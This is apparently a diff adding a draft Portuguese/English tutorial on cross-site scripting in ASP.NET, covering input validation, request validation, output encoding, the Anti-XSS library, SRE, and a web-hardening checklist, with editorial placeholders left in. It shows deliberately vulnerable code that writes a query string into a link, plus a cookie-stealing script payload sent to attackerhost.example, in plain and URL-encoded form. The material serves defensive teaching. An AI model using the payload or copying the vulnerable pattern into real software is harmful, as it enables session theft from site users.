+So as with the injection vulnerability, we’re back to untrusted data and validation again. The 
+main difference this time around is that there’s a dependency on leveraging the victim’s browser 
+for the attack. Here’s how it manifests itself and what the downstream impact is:
+
+[Colocar aqui a matriz da OWASP para o XSS - Figura QUADROOWASPXSS.png]
+
+As with the previous description about injection, the attack vectors are numerous but XSS also 
+has the potential to expose an attack vector from a database, that is, data already stored within 
+the application. This adds a new dynamic to things because it means the exploit can be executed 
+well after a system has already been compromised. 
+
+One of the best descriptions I’ve heard of XSS was from Jeff Williams in the OWASP podcast 
+number 67 on XSS where he described it as “breaking out of a data context and entering a code 
+context”. So think of it as a vulnerable system expecting a particular field to be passive data 
+when in fact it carries a functional payload which actively causes an event to occur. The event is normally a request for the browser to perform an activity outside the intended scope of the web 
+application. In the context of security, this will often be an event with malicious intent. 
+Here’s the use case we’re going to work with: Our sample website from part 1 has some links to 
+external sites. The legal folks want to ensure there is no ambiguity as to where this website ends 
+and a new one begins, so any external links need to present the user with a disclaimer before 
+they exit. 
+In order to make it easily reusable, we’re passing the URL via query string to a page with the 
+exit warning. The page displays a brief message then allows the user to continue on to the 
+external website. As I mentioned in part 1, these examples are going to be deliberately simple 
+for the purpose of illustration. I’m also going to turn off ASP.NET request validation and I’ll 
+come back around to why a little later on. Here’s how the page looks: 
+
+You can see the status bar telling us the link is going to take us off to http://www.asp.net/ 
+which is the value of the “Url” parameter in the location bar. Code wise it’s pretty simple with 
+the ASPX using a literal control: 
+<p>You are now leaving this site - we're no longer responsible!</p> 
+<p><asp:Literal runat="server" ID="litLeavingTag" /></p> 
+
+And the code behind simply constructing an HTML hyperlink: 
+var newUrl = Request.QueryString["Url"]; 
+var tagString = "<a href=" + newUrl + ">continue</a>"; 
+litLeavingTag.Text = tagString; 
+So we end up with HTML syntax like this: 
+<p><a href=http://www.asp.net>continue</a></p> 
+This works beautifully plus it’s simple to build, easy to reuse and seemingly innocuous in its 
+ability to do any damage. Of course we should have used a native hyperlink control but this 
+approach makes it a little easier to illustrate XSS. 
+So what happens if we start manipulating the data in the query string and including code? I’m 
+going to just leave the query string name and value in the location bar for the sake of 
+succinctness, look at what happens to the “continue” link now: 
+ 
+[Colocar a imagem Figuraxxx_01-XSSImagem.PNG]
+ 
+It helps when you see the parameter represented in context within the HTML: 
+<p><a href=http://www.asp.net>xss>continue</a></p> 
+So what’s happened is that we’ve managed to close off the opening <a> tag and add the text 
+“xss” by ending the hyperlink tag context and entered an all new context. This is referred to as 
+“injecting up”.
+
+[Colocar a imagem Figuraxxx_02-XSSImagem.PNG]
+
+The code then attempts to close the tag again which is why we get the greater than symbol. 
+Although this doesn’t appear particularly threatening, what we’ve just done is manipulated the 
+markup structure of the page. This is a problem, here’s why: 
+
+[Inserir a imagem Figuraxxx_03-XSSImagem.PNG]
+
+Whoa! What just happened? We’ve lost the entire header of the website! By inspecting the 
+HTML source code of the page I was able to identify that a CSS style called “header” is applied 
+to the entire top section of the website. Because my query string value is being written verbatim 
+to the source code I was able to pass in a redefined header which simply turned it off. 
+But this is ultimately just a visual tweak, let’s probe a little further and attempt to actually 
+execute some code in the browser: 
+
+[Inserir a imagem Figuraxxx_04-XSSImagem.PNG]
+
+Let’s pause here because this is where the penny usually drops. What we are now doing is 
+actually executing arbitrary code – JavaScript in this case – inside the victim’s browser and well
+
+outside the intended scope of the application simply by carefully constructing the URL. But of 
+course from the end user’s perspective, they are browsing a legitimate website on a domain they 
+recognise and it’s throwing up a JavaScript message box. 
+Message boxes are all well and good but let’s push things into the realm of a truly maliciously 
+formed XSS attack which actually has the potential to do some damage:
+
+[Inserir a imagem Figuraxxx_04-XSSImagem.PNG]
+
+Inspecting the HTML source code disclosed the ID of the log in link and it only takes a little bit 
+of JavaScript to reference the object and change the target location of the link. What we’ve got 
+now is a website which, if accessed by the carefully formed URL, will cause the log in link to 
+take the user to an arbitrary website. That website may then recreate the branding of the original 
+(so as to keep up the charade) and include username and password boxes which then save the 
+credentials to that site. 
+Bingo. User credentials now stolen. 
+
+What made this possible? 
+As with the SQL injection example in the previous post, this exploit has only occurred due to a 
+couple of entirely independent failures in the application design. Firstly, there was no 
+expectation set as to what an acceptable parameter value was. We were able to manipulate the 
+query string to our heart’s desire and the app would just happily accept the values.
+Secondly, the application took the parameter value and rendered it into the HTML source code 
+precisely. It trusted that whatever the value contained was suitable for writing directly into the 
+href attribute of the tag.
+
+Validate all input against a whitelist 
+
+I pushed this heavily in the previous post and I’m going to do it again now: 
+All input must be validated against a whitelist of 
+acceptable value ranges. 
+URLs are an easy one to validate against a whitelist using a regular expression because there is a 
+specification written for this; RFC3986. The specification allows for the use of 19 reserved 
+characters which can perform a special function:
+
+[Inserir a imagem Figuraxxx_05-XSSImagem.PNG]
+
+And 66 unreserved characters: 
+
+[Inserir a imagem Figuraxxx_06-XSSImagem.PNG]
+
+Obviously the exploits we exercised earlier use characters both outside those allowable by the 
+specification, such as “<”, and use reserved characters outside their intended context, such as 
+“/”. Of course reserved characters are allowed if they’re appropriately encoded but we’ll come 
+back to encoding a little later on. 
+There’s a couple of different ways we could tackle this. Usually we’d write a regex (actually, 
+usually I’d copy one from somewhere!) and there are plenty of URL regexes. out there to use as 
+a starting point. 
+However things are a little easier in .NET because we have the Uri.IsWellFormedUriString 
+method. We’ll use this method to validate the address as absolute (this context doesn’t require 
+relative addresses), and if it doesn’t meet RFP3986 or the internationalised version, RFP3987, 
+we’ll know it’s not valid.
+
+var newUrl = Request.QueryString["Url"]; 
+if (!Uri.IsWellFormedUriString(newUrl, UriKind.Absolute))
+{ 
+  litLeavingTag.Text = "An invalid URL has been specified."; 
+  return; 
+}
+
+This example was made easier because of the native framework validation for the URL. Of 
+course there are many examples where you do need to get your hands a little dirtier and actually 
+write a regex against an expected pattern. It may be to validate an integer, a GUID (although of 
+course we now have a native Guid.TryParse in .NET 4) or a string value that needs to be within 
+an accepted range of characters and length. The stricter the whitelist is without returning false 
+positives, the better. 
+The other thing I’ll touch on again briefly in this post is that the “validate all input” mantra 
+really does mean all input. We’ve been using query strings but the same rationale applies to 
+form data, cookies, HTTP headers etc, etc. If it’s untrusted and potentially malicious, it gets 
+validated before doing anything with it.
+
+Always use request validation – just not exclusively 
+Earlier on I mentioned I’d turned .NET request validation off. Let’s take the “picture speaks a 
+thousand words” approach and just turn it back on to see what happens:
+
+[Inserir a imagem Figuraxxx_07-XSSImagem.PNG]
+[Inserir a imagem Figuraxxx_08-XSSImagem.PNG]
+
+Request validation is the .NET framework’s native defence against XSS. Unless explicitly 
+turned off, all ASP.NET web apps will look for potentially malicious input and throw the error 
+above along with an HTTP 500 if detected. So without writing a single line of code, the XSS 
+exploits we attempted earlier on would never occur. 
+However, there are times when request validation is too invasive. It’s an effective but primitive 
+control which operates by looking for some pretty simple character patterns. But what if one of 
+those character patterns is actually intended user input? 
+
+A good use case here is rich HTML editors. Often these are posting markup to the server 
+(some of them will actually allow you to edit the markup directly in the browser) and with 
+request validation left on the post will never process. Fortunately though, we can turn off the 
+validation within the page directive of the ASPX: 
+
+<%@ Page Language="C#" MasterPageFile="~/Site.Master" AutoEventWireup="true" 
+CodeBehind="LeavingSite.aspx.cs" Inherits="Web.LeavingSite" Title="Leaving 
+Site" ValidateRequest="false" %> 
+
+Alternatively, request validation can be turned off across the entire site within the web.config: 
+
+<pages validateRequest="false" /> 
+
+Frankly, this is simply not a smart idea unless there is a really good reason why you’d want to 
+remove this safety net from every single page in the site. I wrote about this a couple of months 
+back in Request Validation, DotNetNuke and design utopia and likened it to turning off the 
+electronic driver aids in a high performance car. Sure, you can do it, but you’d better be damn 
+sure you know what you’re doing first. 
+Just a quick note on ASP.NET 4; the goalposts have moved a little. The latest framework 
+version now moves the validation up the pipeline to before the BeginRequest event in the 
+HTTP request. The good news is that the validation now also applies to HTTP requests for 
+resources other than just ASPX pages, such as web services. The bad news is that because the 
+validation is happening before the page directive is parsed, you can no longer turn it off at the 
+page level whilst running in .NET 4 request validation mode. To be able to disable validation 
+we need to ask the web.config to regress back to 2.0 validation mode: 
+
+<httpRuntime requestValidationMode="2.0" /> 
+
+The last thing I’ll say on request validation is to try and imagine it’s not there. It’s not an excuse 
+not to explicitly validate your input; it’s just a safety net for if you miss a fundamental piece of 
+manual validation. The DotNetNuke example above is a perfect illustration of this; it ran for 
+quite some time with a fairly serious XSS flaw in the search page but it was only exploitable 
+because they'd turned off request validation site wide. 
+Don’t turn off .NET request validation anywhere unless you absolutely have to and even then, 
+only do it on the required pages. 
+
+HTML output encoding 
+Another essential defence against XSS is proper use of output encoding. The idea of output 
+encoding is to ensure each character in a string is rendered so that it appears correctly in the 
+output media. For example, in order to render the text <i> in the browser we need to encode it 
+into &lt;i&gt; otherwise it will take on functional meaning and not render to the screen. 
+It’s a little difficult to use the previous example because we actually wanted that string rendered 
+as provided in the HTML source as it was a tag attribute (the Anti-XSS library I’ll touch on 
+shortly has a suitable output encoding method for this scenario). Let’s take another simple case, 
+one that regularly demonstrates XSS flaws: 
+
+[Inserir a imagem Figuraxxx_09-XSSImagem.PNG]
+
+This is a pretty common scene; enter your name and email and you’ll get a friendly, personalised
+response when you’re done. The problem is, oftentimes that string in the thank you message is 
+just the input data directly rewritten to the screen: 
+var name = txtName.Text; 
+var message = "Thank you " + name; 
+lblSignupComplete.Text = message; 
+This means we run the risk of breaking out of the data context and entering the code context, 
+just like this: 
+
+[Inserir a imagem Figuraxxx_10-XSSImagem.PNG]
+
+Given the output context is a web page, we can easily encode for HTML: 
+
+var name = Server.HtmlEncode(txtName.Text); 
+var message = "Thank you " + name; 
+lblSignupComplete.Text = message; 
+
+Which will give us a totally different HTML syntax with the tags properly escaped: 
+Thank you Troy &lt;i&gt;Hunt&lt;/i&gt; 
+And consequently we see the name being represented in the browser precisely as it was entered 
+into the field: 
+
+[Inserir a imagem Figuraxxx_11-XSSImagem.PNG]
+
+So the real XSS defence here is that any text entered into the name field will now be rendered 
+precisely in the UI, not precisely in the code. If we tried any of the strings from the earlier 
+exploits, they’d fail to offer any leverage to the attacker. 
+Output encoding should be performed on all untrusted data but it’s particularly important on 
+free text fields where any whitelist validation has to be fairly generous. There are valid use cases 
+for allowing angle brackets and although a thorough regex should exclude attempts to 
+manufacture HTML tags, the output encoding remains invaluable insurance at a very low cost. 
+
+One thing you need to keep in mind with output encoding is that it should be applied to 
+untrusted data at any stage in its lifecycle, not just at the point of user input. The example above 
+would quite likely store the two fields in a database and redisplay them at a later date. The data 
+might be exposed again through an administration layer to monitor subscriptions or the name 
+could be included in email notifications. This is persisted or stored XSS as the attack is actually 
+stored on the server so every single time this data is resurfaced, it needs to be encoded again. 
+Non-HTML output encoding 
+There’s a bit of a sting in the encoding tail; not all output should be encoded to HTML. 
+JavaScript is an excellent case in point. Let’s imagine that instead of writing the thankyou to the 
+page in HTML, we wanted to return the response in a JavaScript alert box: 
+
+var name = Server.HtmlEncode(txtName.Text); 
+var message = "Thank you " + name; 
+var alertScript = "<script>alert('" + message + "');</script>"; 
+ClientScript.RegisterClientScriptBlock(GetType(), "ThankYou", alertScript); 
+
+Let’s try this with the italics example from earlier on: 
+
+[Inserir a imagem Figuraxxx_12-XSSImagem.PNG]
+
+Obviously this isn’t what we want to see as encoded HTML simply doesn’t play nice with 
+JavaScript – they both have totally different encoding syntaxes. Of course it could also get a lot 
+worse; the characters that could be leveraged to exploit JavaScript are not necessarily going to 
+be caught by HTML encoding at all and if they are, they may well be encoded into values not 
+suitable in the JavaScript context. This brings us to the Anti-XSS library.
+
+Anti-XSS 
+JavaScript output encoding is a great use case for the Microsoft Anti-Cross Site Scripting 
+Library also known as Anti-XSS. This is a CodePlex project with encoding algorithms for 
+HTML, XML, CSS and of course, JavaScript. 
+
+A fundamental difference between the encoding performed by Anti-XSS and that done by the 
+native HtmlEncode method is that the former is working against a whitelist whilst the latter to a 
+blacklist. In the last post I talked about the differences between the two and why the whitelist 
+approach is the more secure route. Consequently, the Anti-XSS library is a preferable choice 
+even for HTML encoding. 
+Moving onto JavaScript, let’s use the library to apply proper JavaScript encoding to the previous 
+example: 
+
+var name = AntiXss.JavaScriptEncode(txtName.Text, false); 
+var message = "Thank you " + name; 
+var alertScript = "<script>alert('" + message + "');</script>"; 
+ClientScript.RegisterClientScriptBlock(GetType(), "ThankYou", alertScript); 
+
+We’ll now find a very different piece of syntax to when we were encoding for HTML: 
+
+<script>alert('Thank you Troy \x3ci\x3eHunt\x3c\x2fi\x3e');</script>
+
+And we’ll actually get a JavaScript alert containing the precise string entered into the textbox: 
+
+[Inserir a imagem Figuraxxx_12-XSSImagem.PNG]
+
+Using an encoding library like Anti-XSS is absolutely essential. The last thing you want to be 
+doing is manually working through all the possible characters and escape combinations to try 
+and write your own output encoder. It’s hard work, it quite likely won’t be comprehensive 
+enough and it’s totally unnecessary. 
+One last comment on Anti-XSS functionality; as well as output encoding, the library also has 
+functionality to render “safe” HTML by removing malicious scripts. If, for example, you have 
+an application which legitimately stores markup in the data layer (could be from a rich text 
+editor), and it is to be redisplayed to the page, the GetSafeHtml and GetSafeHtmlFragment 
+methods will sanitise the data and remove scripts. Using this method rather than HtmlEncode 
+means hyperlinks, text formatting and other safe markup will functionally render (the 
+behaviours will work) whilst the nasty stuff is stripped. 
+
+Deixando o leitor melhor informado, o ASP.NET MVC 4 já vem com proteção contra XSS. Porém, caso o leitor  queira implementar em versões anteriores do ASP.NET MVC3, pode ser uma excelente solução contra o XSS.
+
+SRE 
+Another excellent component of the Anti-XSS product is the Security Runtime Engine or SRE. 
+This is essentially an HTTP module that hooks into the pre-render event in the page lifecycle 
+and encodes server controls before they appear on the page. You have quite granular control 
+over which controls and attributes are encoded and it’s a very easy retrofit to an existing app. 
+
+Firstly, we need to add the AntiXssModule reference alongside our existing AntiXssLibrary 
+reference. Next up we’ll add the HTTP module to the web.config: 
+
+<httpModules> 
+  <add name="AntiXssModule" type="Microsoft. 
+    Security.Application.SecurityRuntimeEngine.AntiXssModule"/> 
+</httpModules> 
+
+The final step is to create an antixssmodule.config file which maps out the controls and 
+attributes to be automatically encoded. The Anti-XSS installer gives you the Configuration 
+Generator for SRE which helps automate the process. Just point it at the generated website 
+assembly and it will identify all the pages and controls which need to be mapped out:
+
+[Inserir a imagem Figuraxxx_13-XSSImagem.PNG]
+[Inserir a imagem Figuraxxx_14-XSSImagem.PNG]
+
+The generate button will then allow you to specify a location for the config file which should be 
+the root of the website. Include it in the project and take a look: 
+
+<Configuration> 
+  <ControlEncodingContexts> 
+    <ControlEncodingContext FullClassName="System.Web.UI.WebControls.Label" 
+      PropertyName="Text" EncodingContext="Html" />
+	</ControlEncodingContexts> 
+  <DoubleEncodingFilter Enabled="True" /> 
+  <EncodeDerivedControls Enabled="True" /> 
+  <MarkAntiXssOutput Enabled="False" Color="Yellow" /> 
+</Configuration>
+
+I’ve removed a whole lot of content for the purpose of demonstration. I’ve left in the encoding 
+for the text attribute of the label control and removed the 55 other entries that were created 
+based on the controls presently being used in the website. 
+If we now go right back to the first output encoding demo we can run the originally vulnerable 
+code which didn’t have any explicit output encoding: 
+var name = txtName.Text; 
+var message = "Thank you " + name; 
+lblSignupComplete.Text = message; 
+
+And hey presto, we’ll get the correctly encoded output result:
+
+[Inserir a imagem Figuraxxx_14-XSSImagem.PNG]
+
+This is great because just as with request validation, it’s an implicit defence which looks after 
+you when all else fails. However, just like request validation you should take the view that this is 
+only a safety net and doesn’t absolve you of the responsibility to explicitly output encode your 
+responses. 
+SRE is smart enough not to double-encode so you can happily run explicit and implicit 
+encoding alongside each other. It will also do other neat things like apply encoding on control 
+attributes derived from the ones you’ve already specified and allow encoding suppression on 
+specific pages or controls. Finally, it’s a very easy retrofit to existing apps as it’s a no-code 
+solution. This is a pretty compelling argument for people trying to patch XSS holes without 
+investing in a lot of re-coding. 
+
+Threat model your input 
+One way we can pragmatically asses the risks and required actions for user input is to perform 
+some basic threat modelling on the data. Microsoft provides some good tools and guidance for 
+application threat modelling but for now we’ll just work with a very simple matrix. 
+In this instance we’re going to do some very basic modelling simply to understand a little bit 
+more about the circumstances in which the data is captured, how it’s handled afterwards and 
+what sort of encoding might be required. Although this is a pretty basic threat model, it forces 
+you stop and think about your data more carefully
+
+Try mapping out the flow of your data in the format and see if it makes 
+it back out to a UI without proper encoding. If the XSS stats are to be believed, you’ll probably 
+be surprised by the outcome. 
+
+Delivering the XSS payload 
+The examples above are great illustrations, but they’re non-persistent in that the app relied on 
+us entering malicious strings into input boxes and URL parameters. So how is an XSS payload 
+delivered to an unsuspecting victim? 
+The easiest way to deliver the XSS payload – that is the malicious intent component – is by 
+having the victim follow a loaded URL. Usually the domain will appear legitimate and the 
+exploit is contained within parameters of the address. The payload may be apparent to those 
+who know what to look for but it could also be also be far more subvert. Often URL encoding 
+will be used to obfuscate the content. For example, the before state: 
+
+username=<script>document.location='http://attackerhost.example/cgi-bin/cookiesteal.cgi?'+document.cookie</script>
+
+And the encoded state: 
+
+username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%6
+9%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%
+78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C
+%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73%6
+3%72%69%70%74%3E 
+
+Another factor allowing a lot of potential for XSS to slip through is URL shorteners. The actual 
+address behind http://bit.ly/culCJi is usually not disclosed until actually loaded into the 
+browser. Obviously this activity alone can deliver the payload and the victim is none the wiser 
+until it’s already loaded (if they even realise then). 
+This section wouldn’t be complete without at least mentioning social engineering. Constructing 
+malicious URLs to exploit vulnerable sites is one thing, tricking someone into following them is 
+quite another. However the avenues available to do this are almost limitless; spam mail, 
+phishing attempts, social media, malware and so on and so on. Suffice to say the URL needs to 
+be distributed and there are ample channels available to do this. 
+The reality is the payload can be delivered through following a link from just about anywhere. 
+But of course the payload is only of value when the application is vulnerable. Loaded URLs 
+manipulated with XSS attacks are worthless without a vulnerable target. 
+IE8 XSS filter 
+So far we’ve focussed purely on how we can implement countermeasures against XSS on the 
+server side. Rightly so too, because that’s the only environment we really have direct control 
+over. 
+However, it’s worth a very brief mention that steps are also being taken on the client side to 
+harden browsers against this pervasive vulnerability. As of Internet Explorer 8, the internet’s 
+most popular browser brand now has an XSS Filter which attempts to block attempted attacks 
+and report them to the user:
+
+[Inserir a imagem Figuraxxx_16-XSSImagem.PNG]
+
+This particular implementation is not without its issues though. There are numerous examples 
+of where the filter doesn’t quite live up to expectations and can even open new vulnerabilities 
+which didn’t exist in the first place. 
+However, the action taken by browser manufacturers is really incidental to the action required 
+by web application developers. Even if IE8 implemented a perfect XSS filter model we’d still be 
+looking at many years before older, more vulnerable browsers are broadly superseded. 
+Given more than 20% of people are still running IE6 at the time of writing, now almost a 9 
+year old browser, we’re in for a long wait before XSS is secured in the client. 
+
+Summary 
+We have a bit of a head start with ASP.NET because it’s just so easy to put up defences against 
+XSS either using the native framework defences or with freely available options from Microsoft. 
+Request validation, Anti-XSS and SRE are all excellent and should form a part of any security 
+conscious .NET web app. 
+Having said that, none of these absolve the developer from proactively writing secure code. 
+Input validation, for example, is still absolutely essential and it’s going to take a bit of effort to 
+get right in some circumstances, particularly in writing regular expression whitelists. 
+
+However, if you’re smart about it and combine the native defences of the framework with 
+securely coded application logic and apply the other freely available tools discussed above, you’ll 
+have a very high probability of creating an application secure from XSS. 
+
+Não vamos cobrir todos os casos,posto que se assim o for, o artigo ficará grande e cansativo demais para a leitura, portanto vamos mostrar apenas os ataque por CRSF, que também é bastante comum dentro do ambiente ASP.NET, e a Quebra de Autenticação & Controle de Sessão, já os demais tipos de ataque do Top 10, você pode acessar através da seção Links. Vejamos então a ameaça de Quebra de Autenticação.
+
+[Cobrir a part 3 do PDF]
+
+[Cobrir a parte 5 CSRF ]
+
+Após estas brechas serem corrigidas, podemos verificar outras 10 formas de medidas de segurança extremamente úteis para o desenvolvimento de aplicações .NET
+
+- As 10 medidas mais proativas para proteger a sua aplicação Web
+
+Content-Security-Policy: We highly recommend you implement this with the alerting turned on so that you can see what’s breaking as your devs are working on it. It can be extremely difficult to build into your site retroactively, because it usually involves either adding so many whitelists that it’s practically worthless, or having to go painstakingly through your site to create a massive inventory, hoping that you don’t miss anything along the way. There is now a bookmarklet to help as well.
+
+X-Frame-Options: We highly recommend you put it into in block mode, which will help with clickjacking attacks and other framing attacks. This can be painful to implement after the fact because many sites over time start framing your site and using it in that manner. Getting each site to update their site that links to you can be hugely painful.
+
+anti-CSRF cryptographic nonces on all secure functions: We recommend building nonces (one time tokens tied to user sessions) into each form and validating that to ensure that your site can’t be forced to perform actions. This can be a huge pain to retrofit because it means touching a database or shared memory on every hit — not to mention the code that needs to be inserted into each page with a form and subsequent function to validate the nonce.
+
+DAL (data/database access layer): DALs help to prevent SQLinjection. Few companies know about them or use them correctly, but by front ending all databases with an abstraction layer many forms of SQL injection simply fail to work because they are not correctly formed. DALs can be expensive and extremely complex to retrofit because every single database call requires modification and interpolation at the DAL layer.
+Unwritable file system: Making the website code and webserver configs on the file system unwritable by the web user is a huge security advantage post-compromise. Almost no websites take this preventative action but it makes many forms of exploitation nearly impossible. Retrofitting this is difficult to do later because tons of things tend to rely on local file system writes as the site evolves over time, even though this type of design can be extremely sloppy.
+
+Forensically secure logging: Logs that are sent off-host or are made otherwise inaccessible by the web user help prevent overwriting the file system, local include attacks, removing the attacker’s tracks from the logs and so on. It’s difficult to explain how useful it is to have untampered logs until after it’s too late. It is difficult to retrofit because it usually requires setting up a different logging infrastructure and establishing some way to copy or automatically transport the logs.
+
+Secure credential/passwd/secret questions and answers storage: How many sites have we seen compromised and all of the information is taken? In most cases it is either plaintext or poorly hashed with an obsolete hashing algorithm, like MD5. Assuming that everything in the database is copied off, the attacker still shouldn’t have access to anything without spending huge amounts of resources to crack individual rows. This can be extremely complex to retrofit because many site functions rely on existing database designs and the associated structured data.
+
+SSL, cookies with secure flags, cookies with httponly and STS: Creating a site that doesn’t support SSL means that it is extremely vulnerable to man in the middle attacks. This is a common thing to see sites focus on, but without also having strong cookies that resist being stolen there’s almost no point in using SSL in many cases. STS helps to ensure that users cannot be downgraded to HTTP. Ultimately all of this can be extremely difficult to fix retroactively. JavaScript behaves differently when cookies can’t be accessed, links may break, and so on.
+Security frameworks: Libraries for handling and sanitizing or rejecting user input (XSS, SQLi, Command injection, etc…) greatly improves your ability to proactively protect yourself when used uniformly across the site. Libraries like this tend to require changing many site functions and these frameworks therefore touch almost every input, so it can be a nightmare to build after the fact.
+
+autocomplete=”off” and strong passwords: To protect your site from brute force and from the recent rash of security issues in autocomplete, it is a good idea to implement both of these. If your users think the browser will remember their passwords for them it’s going to be a nightmare when you turn autocomplete=”off” later. If you turn it off early, they’ll choose weak passwords. So you really need both at the same time. You don’t want the support costs of all of your users calling you trying to figure out how to get back into their account.
+There are plenty of other great things you can and should do to protect your website, but for the most part they are far easier to implement after the fact than these would be if you do forget them.
+
+
+
+ --############################################################
+ PARTE PRÁTICA
+ --############################################################
+ <Checkpoint>
 [Depois de criar todas as Camadas de Entidade, Generico, DAL e Persistência]
 
 - TDD 
@@ -37,3 +1492,12 @@ TestFixture: informa que a classe decorada faz parte de uma Unidade de Testes do
 Test: é para se colocada sobre um método, informa que este método é um Teste Unitário
 SetUp: Serve para carregar alguma ação antes dos testes propriamente ditos, um exemplo disto, é a conexão com o nosso DataContext chamado Conexao, para que possamos executar os testes unitários, nós precisamos,primeiro, da conexão com o banco de dados, então basta criar um método e decorá-lo com o atributo SetUp que este será sempre executado primeiro antes de quaisquer método anotado após TestFixture.
 TearDown: Qualquer método decorado com este atributo, é executado depois de todos os Métodos anotados como Test, ele é o responsável por executar os métodos de finalização dos testes, pode ser uma gravação em algum banco de dados para persistir os resultados de um teste, pode ser para fechar uma conexão, commitar ou efetuar rollback, efetuar um dispose ou mesmo uma mensagem de saída. É uma boa prática sempre se utilizar o TearDown para forçar o fechamento, dispose ou qualquer outra ação a ser executada ao final dos testes unitários.
+
+Links:
+
+http://www.dailytech.com/MD5+Is+Officially+Insecure+Hackers+Break+SSL+Certificates+Impersonate+CA/article13842.htm - MD5 é oficialmente declarado inseguro
+http://www.w3.org/TR/CSP/ - Content Security Police
+http://blogs.msdn.com/b/ie/archive/2009/01/27/ie8-security-part-vii-clickjacking-defenses.aspx - Formas de defesa contra ClickJacking 
+https://docs.djangoproject.com/en/1.4/ref/contrib/csrf/ - Um exemplo de aplicação de segurança para evitar CSRF
+https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project - OWASP Projeto Top 10
+http://stackoverflow.com/questions/5034586/security-runtime-engine-vs-antixss-library - Discussão muito interessante sobre o Security Runtime Engine.
